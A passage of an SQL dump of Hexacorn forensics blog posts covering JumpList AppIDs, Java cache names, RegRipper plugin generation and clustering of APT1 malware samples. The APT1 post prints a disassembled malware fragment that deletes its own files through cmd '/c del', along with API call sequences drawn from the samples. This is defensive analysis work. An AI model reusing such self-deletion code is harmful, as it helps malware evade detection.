Silverlight\nMicrosoft.InternetExplorer.Default – Internet Explorer\nVMware.Workstation.vmplayer – VMWare Player\nMicrosoft.Windows.MediaPlayer32 – Windows Media Player (32-bit)\nMicrosoft.Windows.MediaPlayer64 – Windows Media Player (64-bit)\n\nFor this reason, attempting to find e.g. AppID of c:\\program files\\Internet Explorer\\iexplore.exe doesn’t really make sense as all IE windows are grouped under Microsoft.InternetExplorer.Default AppID.\nExamples\nAppIDs of InternetExplorer and Sticky Notes\n\nThese can be confirmed by looking at Forensic Wiki:\n\nMicrosoft.InternetExplorer.Default – 28C8B86DEAB549A1\n\n\n\nMicrosoft.Windows.StickyNotes – 337ED59AF273C758\n\n\n Notepad\n\nYou may notice that in this example there are 2 different AppIDs shown. This is because of the ambiguity I mentioned earlier; applications running on 64-bit systems can be executed in more than one configuration and since there is WOW64 folder redirection happening AppID needs to be calculated in a context.\nThe Notepad path looks the same to both 32- and 64-bit application (because of WOW64 folder redirection):\n\nc:\\windows\\system32\\notepad.exe\n\nbut the AppID depends on a type of Notepad .exe file:\n\nif it is 32-bit, the AppID is 918E0ECB43D17E23 \nif 64-bit, the AppID is 9B9CDC69C1C24E2B.\n\nThis can be also confirmed via Forensic Wiki:\n\nInternet Explorer – via path\nIt gets even more complicated with Program Files folder as it has two versions – with and without (X86) and 32-/64- bit applications both ‘see’ Program Files the same way. As an example we could try to generate a hash for Internet Explorer in various configurations by running appid calculator and providing to it a path to c:\\Program Files\\Internet Explorer\\iexplore.exe. As mentioned earlier IE uses an AppID that it sets up during the launch, so you should never see AppIDs shown on the screenshot below, but it is a simple example to show various configurations of Program Files folder using a well-known path.\n\nAgain, I strongly suggest reading the Microsoft Article about KNOWNFOLDERIDs, The appid calculator provides a link to it as well if the path is known to be ambiguous (system32, program files, program files\\common).\nDownload\nYou can find the script here. This is a first version, coded in a hurry so it may contain bugs. If you find any issues, please let me know. Thanks!\nTo run:\nperl appid_calc.pl\nIf no argument is passed to it, it will calculate a few sample AppIDs – the examples illustrate various ways one can provide the path to the script:\n\nc:\\windows\\notepad.exe\nc:\\windows\\system32\\notepad.exe\nc:\\windows\\syswow64\\notepad.exe\n{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\notepad.exe\nc:\\program files\\Internet Explorer\\iexplore.exe\nMICROSOFT.INTERNETEXPLORER.DEFAULT\n\nShare this :)', 'appid_calc.pl, Forensic Analysis, Software Releases', 'http://www.hexacorn.com/blog/2013/04/30/jumplists-file-names-and-appid-calculator/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (316, 'Permanent Link to Java cache file names', 'Hexacorn', 'April 19, 2013 ', 'I was wondering how Java generates the file names for its temporary cache files and after googling around, I found the answer in the Java source code – the function responsible is called generateCacheFileName and its implementation has changed over the time; here is how they do it in JDK 5 and 6/7:\nJDK 5.xx\nFiles are saved in the following location:\n\n\n%USERPROFILE%\\Application Data\\Sun\\Java\\Deployment\\\r\ncache\\javapi\\v1.0\\[cachefilename]\n\n\nThe procedure for generating [cachefilename] is described here:\n\nhttp://javasourcecode.org/html/open-source/jdk/jdk-5.0/sun/plugin/cache/Cache.java.html#line.249\n\nJDK 6.xx-7.xx\nFiles are saved in the following location:\n\n\n%USERPROFILE%\\Local Settings\\Application Data\\Sun\\Java\\Deployment\\\r\ncache\\6.0\\[cachebucket]\\[cachefilename]\n\n\nThe procedure for generating [cachebucket]\\[cachefilename] is described here:\n\nhttp://javasourcecode.org/html/open-source/jdk/jdk-6u23/com/sun/deploy/cache/Cache.java.html#line.2013\n\nThe code\nI ripped the code from these sources and created a simple java snippet that helps to test cache file name for a given URL. At the moment it has a small bug, but I hope you won’t notice it \nExample – JRE 1.5\nI googled around and found an old applet that worked under JRE 1.5, then visited the page so that the cached files could be created; the URL passed to the cachename Java program produces exactly same result:\n\nExample – JRE 1.6-1.7\nI simply visited Oracle web page that detects the browser and let the applet load:\n\nDownload\nYou can download the code here.\nTo compile, run:\njavac cachename.java\nTo execute, run:\njava cachename url\n \nShare this :)', 'Forensic Analysis, Software Releases', 'http://www.hexacorn.com/blog/2013/04/19/java-cache-file-names/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (317, 'Permanent Link to RegRipper Ripper (3R) and the list of reg keys covered by RR plugins', 'Hexacorn', 'April 4, 2013 ', 'update\nUpdated 3R to cover the latest archive from the RegRipper site – plugins20130403.zip (new version introduced over 40 new scripts)\nold post\nI got curious what keys are already covered by existing 280+ RegRipper Plugins so I wrote a quick and dirty script to retrieve the data from all plugins in an automated way. For the fun of it, I named the script RegRipper Ripper (3R).\nThe script is here, and the result of running it over the latest bundle is available here.\nYou may use the list to see what’s already covered and… avoid writing a plugin for a key that is already handled.\nThe 3R is a dumb script, so a few things I had to fix manually (but still inside the script, so it can be used to regenerate the tables anytime needed, e.g. after the bundle update). I hope there are no mistakes, but if you spot any, please let me know and I will fix that. Thanks!\nShare this :)', '3RPG, Forensic Analysis', 'http://www.hexacorn.com/blog/2013/04/04/regripper-ripper-3r-and-the-list-of-reg-keys-covered-by-rr-plugins/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (318, 'Permanent Link to 3RPG – 4 RegRipper Plugins in 15 minutes', 'Hexacorn', 'March 15, 2013 ', 'In this post I show how to quickly develop 4 plugins using 3RPG. Except for the documentation (this post) it took barely 10-15 minutes.\nYou can download plugins here.\n01. Detecting presence of 7zip on the system\n7Zip has a key in the following location\nHKEY_LOCAL_MACHINE\\SOFTWARE\\7-Zip\nThis is enough to build the script:\n\nNote that the name of the script is automatically prefixed with an underscore (7zip -> _7zip) for names starting with digits (it’s because perl doesn’t ‘like’ it).\nAlso, when you paste the 7zip registry key, and change the focus 3RPG will automatically strip HKEY_LOCAL_MACHINE\\SOFTWARE part:\nNow click the code – 3RPG will automatically select it all for your convenience.\n\nYou can now copy this to any editor and save – use a name highlighted in red and with an extension .pl i.e. _7zip.pl.\nThen run:\nperl rip.pl -r SOFTWARE.copy0 -p _7zip\nThe result:\n\n02 Listing persistent network mappings\nAll mapped drives are listed under the following key:\nHKEY_CURRENT_USER\\Network\nAgain, we run through the same exercise as previously – this time we include ‘Yes, scan subkeys, depth=2’\n\nThen run:\nperl rip.pl -r NTUSER.DAT -p netmap\nand the result is:\n\n03. Listing all possible CLSID autostart entries\nAmongst various less-known autostart mechanisms that I listed in my older post we can find adding or re-using entries of COM servers. Such technique can be used to introduce a man-in-the-middle code for a legitimate plugins, shell extensions, etc. .\nThe information about the COM servers is stored under the following key:\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\nThe names of DLLs, EXEs, etc. are usually listed under {Default} value, so the plugin below will list (going recursively through the whole node) all possible {Default} values listed under CLSID node.\n\nWe run it as:\nperl rip.pl -r Software2 -p clsid\nAnd the results are:\n\nThis is not a perfect solution as many {Default} values don’t include a file name, but we could either grep results by specific extension e.g. dll, or patch the script manually and add a better routine (e.g. only list values under InprocServer32 and LocalServer32)\n\nLast, but not least – running this plugin often probably doesn’t make sense as it’s very slow, but it is a simple example that demonstrates how to search for {Default} values.\n 04. Listing keys with binary data\nThis is just another simple example showing how REG_BINARY data is presented in the output of plugins generated with 3RGP.\nFor the example, I will look at the key\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\\r\nCurrentVersion\\Print\\Printers\\Microsoft XPS Document Writer\nassociated with Microsoft XPS Document Writer and its value Default DevMode.\nI don’t know what’s exactly inside this key, but since it contains a binary blob, it will serve the purpose here.\n\nWe run it as:\nperl rip.pl -r Software2 -p xps\nAnd the results are:\n\nThat’s it! Thanks for reading!\nShare this :)', '3RPG, Forensic Analysis, Software Releases', 'http://www.hexacorn.com/blog/2013/03/15/3rpg-4-regripper-plugins-in-15-minutes/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (319, 'Permanent Link to 3RPG – Rapid RegRipper Plugin Development', 'Hexacorn', 'March 14, 2013 ', 'Inspired by DFIR posts from users (often non-programmers) requesting help with writing/improving RegRipper plugins I created a new tool that aims at developing RR plugins in a much faster way.\nThe tool is called 3RPG and it’s oriented mainly at non-programmers and less experienced programmers. Of course, if you are an old school perl programmer, go ahead and try it as well. Any feedback and comments will be much appreciated.\nWhat is 3RPG?\n3RPG is a web form that helps you to quickly build Plugins for RegRipper by Harlan Carvey.\nYou just need to fill-in a few fields and the code of the new plugin will be ‘developed’ instantly in front of your eyes.\nYou can go and check how it works here – 1000 words worth screenshot should help you to get the idea:\n\nBenefits a.k.a. why 3RPG was created?\nIf you are a non-programmer…\n\nYou can use a web form to instantly create your own RegRipper Plugin for a specific registry node/key\nIf you need to add extra features, you can pass such script with example data to more experienced RegRipper plugin programmers – trust me, they will appreciate the effort you put into research and will be more eager to help\nYou can save 3RPG as an HTML page and use it offline\n\nIf you are a programmer…\n\nYou know that writing new RegRipper plugins ‘by hand’ is kinda painful i.e. it’s easier to modify existing script to add features than starting from the scratch\nCreating new scripts is usually a copy and paste game – there is always a chance for making a silly typo or mistake\nIn general – in many cases simply (recursively) enumerating a specific registry node/key and cherry-picking something with a simple filter is enough\nAlso, adding a generic data print mechanism for all possible registry data types helps to quickly ‘analyze’ plugins’ output w/o any extra effort\n..and this is exactly what the 3RPG offers; more complex scenarios require (obviously) some manual coding\nYou can also fetch the template and adjust it to your needs manually – I am confident that with small modifications it may support all possible registry retrieval needs\nIf you are curious about technical details, I talk about it at the bottom of this post\n\nHow to use 3RPG?\nJust go to the 3RPG Wizard, fill in the form (takes 1-2 minutes), then copy and paste the resulting script and save to a file – once you do, you are ready to go!\nTo run/test the script, use the newly created file (here myscript) with RegRipper:\nperl rip.pl -r <hive> -p myscript\nFor a typical script, these fields are required:\n\na script name e.g. myplugin.pl\na hive name(s) e.g. Software\na node e.g. Microsoft\\Windows\\CurrentVersion\\Run\na key name/value (works like a filter) e.g. x86\nif you want to scan subkeys (recursively, you can also specify the depth)\nif you want to include Wow6432Node keys (typically, you do since many new systems are 64-bit)\n\nand then leave the rest fields with default values.\nShare!\nIf you write a new plugin, share the script with the community (if you do, please fill-in the rest of the fields to avoid generic/default values in the scripts. Thanks!)\n \nExamples\nSoftware \\ Run key enumeration\nImplementing a classic Run key enumeration for the Software hive is easy – it’s actually already written for you on the 3RPG page (it’s based on default values of 3RPG).\nJust copy the script from 3RPG page\n\nand save it as ‘myscript.pl’, then run it as:\nrip.pl -r SOFTWARE.copy0 -p myscript\nRunning it with a test hive gives the following results:\n\nSoftware \\ Run key enumeration with a specific value\nA similar example as before, we just want to narrow down the search looking for e.g. for ‘MSN’\nWe just need to type ‘msn’ (it’s case insensitive) in ‘What keys/values would you like to include?‘ field:\n\nSaving the resulting script and running as previous will only show keys/values/data for values/data that contain ‘msn’ (keys are not checked as you are enumerating recursively anyway).\n\nTechnical details\n3RPG is a web form. It’s written in HTML + JavaScript. As a base for the plug-in I relied on my old generic RR plugin template that I used in the past. It exploits the fact that the registry data is stored in a tree-like fashion, so recursive enumeration is a natural way of parsing such data w/o going into intricacies of parsing specific keys, values, and conditional processing. It is also very similar to the way command line reg.exe works when executed with ‘query’ or ‘query /s’.\nCurrently, the following features are supported:\n\n3RPG is interactive – changes to the script are instantly visible and highlighted in the source code\nA script name can be specified from the form\nA hive can be selected manually, but script will try to select the correct one based on the key i.e. some hive name(s) are automatically selected when key names including substrings like ‘HKEY_LOCAL_MACHINE\\Software’ are pasted\nEnumeration of keys can be recursive, with a specified depth\nFiltering of key names/values is possible\nCode for parsing Wow6432Node nodes can be added with a single click\nData dumping is supported for all registry data types (non-printable data is printed as hex)\n\nBugs\nIt’s the first version, so bugs are there for sure; if you spot any, please do let me know.\nThanks in advance!\nShare this :)', '3RPG, Forensic Analysis, Software Releases', 'http://www.hexacorn.com/blog/2013/03/14/3rpg-rapid-regripper-plugin-development/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (320, 'Permanent Link to Clustering and Batch Analysis of APT1 sampleset, part 3', 'Hexacorn', 'March 12, 2013 ', 'Part 1, Part 2, Part 3\nIn the last three posts I talked about batch analysis, clustering and applying these techniques to APT sampleset.\nBatch processing is a step necessary for retrieving ‘clusterable’ data from samples in an automated fashion.\nClustering is a way of putting these samples into buckets, potentially grouping them into some families.\nI want to see if w/o using any assumption/knowledge (retrieved from the white paper or other blogs) it is possible to cluster these samples in a reliable way. It is an interesting experiment and I am curious if I will ever get closer to already known clusters. Quite frankly, I don’t know yet. We shall see.\nThe clustering I have done so far was focused on dynamic analysis and a little bit on the source code analysis. In this post I will exploit code analysis further – this time focusing on disassembled .asm files generated as usual by the IDA Pro.\nThe resulting assembly code is quite nice for parsing as each line contains only one line of code – this allows to group the code into blocks on function boundaries and for each call to API or to another subroutine (including calls via registers), we can extract a simplified code of the program procedures e.g.\nsub_401000    proc near        ; CODE XREF: _main+20Ap\r\n[...]\r\n\r\nlea    ecx, [esp+310h+szLongPath]\r\npush    104h        ; nSize\r\npush    ecx        ; lpFilename\r\npush    0        ; hModule\r\ncall    ds:GetModuleFileNameA\r\n\r\nlea    edx, [esp+310h+szLongPath]\r\npush    104h        ; cchBuffer\r\nlea    eax, [esp+314h+szLongPath]\r\npush    edx        ; lpszShortPath\r\npush    eax        ; lpszLongPath\r\ncall    ds:GetShortPathNameA\r\n\r\nlea    ecx, [esp+310h+Parameters]\r\npush    offset String2    ; \"/c del \"\r\npush    ecx        ; lpString1\r\ncall    ds:lstrcpyA\r\n\r\nmov    esi, ds:lstrcatA\r\nlea    edx, [esp+310h+szLongPath]\r\nlea    eax, [esp+310h+Parameters]\r\npush    edx        ; lpString2\r\npush    eax        ; lpString1\r\ncall    esi ; lstrcatA\r\n\r\nlea    ecx, [esp+310h+Parameters]\r\npush    offset s->>>nul    ; \" >>NUL\"\r\npush    ecx        ; lpString1\r\ncall    esi ; lstrcatA\r\n\r\nmov    esi, ds:ShellExecuteA\r\npush    0        ; nShowCmd\r\npush    offset Directory ; lpDirectory\r\nlea    edx, [esp+318h+File]\r\npush    offset Parameters ; \"/c    del wuauclt.exe\"\r\npush    edx        ; lpFile\r\npush    offset Operation ; \"open\"\r\npush    0        ; hwnd\r\ncall    esi ; ShellExecuteA\r\n\r\npush    0        ; nShowCmd\r\npush    offset Directory ; lpDirectory\r\nlea    eax, [esp+318h+File]\r\npush    offset s->CDelSvchost_exe ; \"/c    del svchost.exe\"\r\npush    eax        ; lpFile\r\npush    offset Operation ; \"open\"\r\npush    0        ; hwnd\r\ncall    esi ; ShellExecuteA\r\n\r\n[...]\r\nretnsub_401000    endp\nbecomes\nGetModuleFileNameA\nGetShortPathNameA\nlstrcpyA\nlstrcatA\nlstrcatA\nShellExecuteA\nShellExecuteA\nShellExecuteA\nand can be written as a single line of code\nGetModuleFileNameA|GetShortPathNameA|lstrcpyA|lstrcatA|lstrcatA|ShellExecuteA|ShellExecuteA|ShellExecuteA\nApplying such methodology on procedure boundaries and to each disassembled program I eventually came up with a shortened and flattened source code of each sample. I then built a histogram of the most common sequences of such code blocks across all the source code from all files and got the following stats:\n   5514 |sub\r\n   2507 |sub|sub\r\n   1332 |sub|sub|sub\r\n    860 |sub|sub|sub|sub\r\n    558 |__security_check_cookie(x)\r\n    479 |__security_check_cookie(x)|__security_check_cookie(x)\r\n    475 |sub|sub|sub|sub|sub\r\n    392 |sub|sub|sub|sub|sub|sub\r\n    353 |operator delete(void *)\r\n    276 |sub|operator delete(void *)\r\n    269 |sub|sub|sub|sub|sub|sub|sub\r\n    235 |sub|sub|sub|sub|sub|sub|sub|sub\r\n    185 |sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n    168 |sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n    165 |__alloca_probe|sub|sub\r\n    137 |eax\r\n    132 |sub|sub|ecx\r\n    132 |__alloca_probe|sub\r\n    130 |_atexit\r\n    123 |sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n    110 |_chkstk|sub|sub\r\n    108 |strlen|operator delete(void *)|operator new(uint)|strcpy\r\n    106 |nullsub\r\n    106 |__alloca_probe\r\n    101 |_chkstk|sub\r\n     97 |eax|sub\r\n     92 |__alloca_probe|sub|sub|sub|sub\r\n     91 |__alloca_probe|sub|sub|sub\r\n     88 |_chkstk|sub|sub|sub\r\n     88 |__alloca_probe|sub|sub|sub|sub|sub|sub\r\n     85 |__alloca_probe|sub|sub|sub|sub|sub\r\n     80 |exception const &)\r\n     75 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     73 |strlen\r\n     73 |_chkstk|sub|sub|sub|sub|sub\r\n     72 |sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     71 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     71 |_Tidy(bool,uint)\r\n     69 |sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     68 |sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     68 |_chkstk|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     68 |_chkstk|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     68 |_chkstk|sub|sub|sub|sub|sub|sub|sub|sub\r\n     68 |InternetCloseHandle|InternetCloseHandle|InternetCloseHandle\r\n     67 |sub|eax\r\n     63 |_chkstk|sub|sub|sub|sub|sub|sub\r\n     62 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     62 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub\r\n     61 |free\r\n     60 |sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     60 |allocator<char>>(char const *)|_atexit\r\n     59 |sub|_CxxThrowException(x,x)\r\n     56 |_CxxThrowException\r\n     56 |InternetReadFile\r\n     55 |_chkstk|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     55 |_chkstk\r\n     55 |SetUnhandledExceptionFilter\r\n     52 |operator new(uint)|exception(char const * const &)|_CxxThrowException(x,x)\r\n     52 |operator delete(void *)|_CxxThrowException(x,x)\r\n     52 |_flsall\r\n     51 |_chkstk|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     51 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     50 |_chkstk|sub|sub|sub|sub\r\n     49 |j_free\r\n     48 |_chkstk|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     47 |sub|sub|_CxxThrowException(x,x)\r\n     47 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     45 |sub|sub|sub|sub|eax\r\n     44 |strchr|strchr\r\n     44 |malloc|sub|sub|free\r\n     43 |dword ptr [ecx+8]\r\n     42 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     40 |sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     40 |sub|_Split(void)|_wmemmove|sub|_Eos(uint)|_Split(void)|_Tidy(bool)|sub\r\n     40 |operator delete(void *)|operator delete(void *)\r\n     40 |_chkstk|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     40 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     40 |ReadFile|_memcpy_0\r\n     39 |sub|_CxxThrowException\r\n     39 |GetModuleFileNameA|GetShortPathNameA|GetEnvironmentVariableA|lstrcpyA|lstrcatA|lstrcatA|GetCurrentProcess|SetPriorityClass|GetCurrentThread|SetThreadPriority|ShellExecuteExA|SetPriorityClass|SetProcessPriorityBoost|SHChangeNotify|GetCurrentProcess|SetPriorityClass|GetCurrentThread|SetThreadPriority\r\n     38 |sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     38 |_chkstk|sub|sub|sub|sub|sub|sub|sub\r\n     37 |GetCurrentProcess|OpenProcessToken|LookupPrivilegeValueA|AdjustTokenPrivileges|CloseHandle|GetLastError\r\n     36 |sub|sub|dword ptr [eax]|sub|sub|sub\r\n     36 |sub|ecx\r\n     36 |dword ptr [ecx+4]\r\n     36 |_memset|sub|__security_check_cookie(x)\r\n     35 |sub|sub|__security_check_cookie\r\n     35 |sub|operator delete(void *)|operator delete(void *)|operator delete(void *)|operator delete(void *)\r\n     35 |__invalid_parameter_noinfo\r\n     34 |operator new(uint)\r\n     34 |_free\r\n     34 |_LocaleUpdate(localeinfo_struct *)|___strgtold12_l|sub|__security_check_cookie(x)\r\n     33 |sub|sub|eax|sub\r\n     33 |sub|operator delete(void *)|operator delete(void *)\r\n     33 |_chkstk|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     33 |__errno|__invalid_parameter\r\n     32 |operator delete(void *)|operator new(uint)\r\n     32 |memset\r\n     31 |operator new(uint)|sub\r\n     31 |_chkstk|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     30 |eax|sub|sub|sub|sub\r\n     30 |_chkstk|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     30 |__EH_prolog|_Tidy(bool)|_strlen|sub|sub|_CxxThrowException(x,x)\r\n     30 |SetServiceStatus\r\n     28 |_chkstk|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     27 |sub|_Split(void)|_memcpy|sub|_Eos(uint)|_Split(void)|_Tidy(bool)|sub\r\n     27 |strlen|sub\r\n     27 |memcpy\r\n     27 |_strcmpi|memset|memset|CreateToolhelp32Snapshot|Process32First|sprintf|strcat|Process32Next|CloseHandle|_strcmpi|OpenSCManagerA|EnumServicesStatusExA|operator new(uint)|CloseServiceHandle|strcat|EnumServicesStatusExA|sprintf|strcat|operator delete(void *)|CloseServiceHandle|_strcmpi|GetLogicalDrives|sprintf|strcat|sprintf|strcat|lstrcatA|GetDriveTypeA|strcat|GetVolumeInformationA|strcat|strcat|sprintf|strcat\r\n     27 |_strcmpi|atoi|OpenProcess|TerminateProcess|CloseHandle|strcat|_strcmpi|OpenSCManagerA|OpenServiceA|GetLastError|strcat|CloseServiceHandle|ControlService|GetLastError|strcat|CloseServiceHandle|CloseServiceHandle\r\n     27 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub\r\n     27 |GetProcAddress\r\n     27 |GetExitCodeProcess|PeekNamedPipe|Sleep|ReadFile|CloseHandle|CloseHandle|memset|strcpy|strlen\r\n     26 |sub|sub|sub|sub|_memcpy_s\r\n     26 |sub|eax|sub|eax|sub\r\n     26 |sub|_Tidy(bool)|_Tidy(bool)|sub\r\n     26 |strstr|strchr|operator new(uint)|strchr|strchr|strchr|strchr|strchr|strchr|strchr|strchr|strchr|operator delete(void *)\r\n     26 |strlen|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     26 |sprintf|HttpAddRequestHeadersA|HttpSendRequestA|GetLastError|InternetQueryOptionA|InternetSetOptionA|sprintf\r\n     26 |__ld12cvt\r\n     26 |___strgtold12|sub\r\n     26 |__EH_prolog3|sub|sub|_CxxThrowException(x,x)\r\n     26 |InternetOpenA|InternetSetOptionA|InternetSetOptionA|InternetSetOptionA|InternetConnectA|HttpOpenRequestA|strlen|HttpAddRequestHeadersA\r\n     26 |$+5\r\n     25 |rand\r\n     25 |malloc|CreatePipe|CreatePipe|CloseHandle|CloseHandle|CloseHandle|CloseHandle|free|sub|CloseHandle|CloseHandle\r\n     25 |_chkstk|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     25 |__invalid_parameter_noinfo|__invalid_parameter_noinfo\r\n     25 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     25 |URLDownloadToFileA|strcat\r\n     24 |sub|sub|sub|sub|sub|GetProcAddress|sub|sub|sub\r\n     24 |sub|edx|sub\r\n     24 |sub|_Split(void)|_wmemmove|sub|_Eos(uint)|_Split(void)|sub|sub\r\n     24 |shutdown|closesocket\r\n     24 |send\r\n     24 |fopen|fseek|fread|fseek|ftell|fseek|fread|fclose|fclose|fread|fclose|sub\r\n     24 |edx\r\n     24 |dword ptr [eax+40h]\r\n     24 |_beginthreadex|CloseHandle\r\n     24 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     24 |GetModuleHandleA|GetProcAddress\r\n     23 |unknown_libname_1\r\n     23 |sub|sub|sub|sub|operator delete(void *)\r\n     23 |sub|OpenProcess|TerminateProcess|Sleep|CloseHandle|sub\r\n     23 |strlen|CreateFileA|strlen|operator new(uint)|memset|WriteConsoleInputA|operator delete(void *)|CloseHandle\r\n     23 |strcat|sub|WaitForSingleObject|strcat|strcat|strlen|sub\r\n     23 |j_free|j_free\r\n     23 |j_free|_CxxThrowException\r\n     23 |LoadStringA|sub\r\n     23 |CloseHandle\r\n     22 |~type_info(void)|operator delete(void *)\r\n     22 |sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     22 |sub|operator new(unsigned __int64)|exception(char const * const &)|_CxxThrowException|sub|sub|j_free\r\n     22 |operator new(uint)|operator new(uint)|sub\r\n     22 |operator new(uint)|operator delete(void *)\r\n     22 |operator delete(void *)|operator delete(void *)|operator delete(void *)\r\n     22 |exception(char const * const &)\r\n     22 |eax|sub|sub|sub\r\n     22 |GetCurrentProcess|GetCurrentProcess|DuplicateHandle|CreateProcessA|CloseHandle\r\n     22 |CompareStringA\r\n     22 |$+5|sub|sub\r\n     21 |sub|_wcslen|sub|sub|sub|sub\r\n     21 |sprintf|sprintf|sub\r\n     21 |malloc|recv|sub|sub|_strnicmp|WriteFile|recv|free|ExitThread|SetEvent|free|ExitThread\r\n     21 |malloc|PeekNamedPipe|ReadFile|sub|sub|_itoa|send|sub|Sleep|PeekNamedPipe|free|ExitThread\r\n     21 |_strcmpi|memset|CreateProcessA|strcat|CloseHandle|_strcmpi|OpenSCManagerA|strcat|OpenServiceA|GetLastError|strcat|CloseServiceHandle|StartServiceA|GetLastError|strcat|CloseServiceHandle|CloseHandle\r\n     21 |__get_sse2_info\r\n     21 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     21 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     21 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     21 |__alloca_probe|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub|sub\r\n     21 |GetCurrentProcess|OpenProcess|GetLastError|sprintf|strcat|OpenProcessToken|memset|sprintf|CreateProcessAsUserA|strcat|CloseHandle|CloseHandle|GetLastError|sprintf|strcat|CloseHandle|GetLastError|sprintf|strcat|CloseHandle\r\n     21 |CreateEventA|CreateEventA|sub|WaitForSingleObject|CloseHandle\r\n     21 |$+5|sub\nUsing these shortened procedures for cluster generations gives some promising results e.g.:\nsub\r\nDeleteFileW\r\nDeleteFileA\r\n\r\n1328eaceb140a3863951d18661b097af.asm\r\n31e5e58dbdfad05175613e795298ebb5.asm\r\n6f9992c486195edcf0bf2f6ee6c3ec74.asm\r\nc99fa835350aa9e2427ce69323b061a9.asm\r\ne476e4a24f8b4ff4c8a0b260aa35fc9f.asm\r\nea1b44094ae4d8e2b63a1771a3e61fd5.asm\r\nfc1937c1aa536b3744ebdfb1716fd54d.asm\nLoadLibraryA\r\nGetProcAddress\r\nGetProcAddress\r\nGetProcAddress\r\n\r\n3f8682ab074a097ebbaadbf26dfff560.asm\r\n4b19a2a6d40a5825e868c6ef25ae445e.asm\r\n54d5d171a482278cc8eacf08d9175fd7.asm\r\n56de2854ef64d869b5df7af5e4effe3e.asm\r\n75dad1ccabae8adeb5bae899d0c630f8.asm\r\n8462a62f13f92c34e4b89a7d13a185ad.asm\nhtons\r\nsocket\r\nconnect\r\nclosesocket\r\n\r\n468ff2c12cffc7e5b2fe0ee6bb3b239e.asm\r\n727a6800991eead454e53e8af164a99c.asm\r\nbd8b082b7711bc980252f988bb0ca936.asm\r\ndb05df0498b59b42a8e493cf3c10c578.asm\r\ne1b6940985a23e5639450f8391820655.asm\necx\r\neax\r\ndword ptr 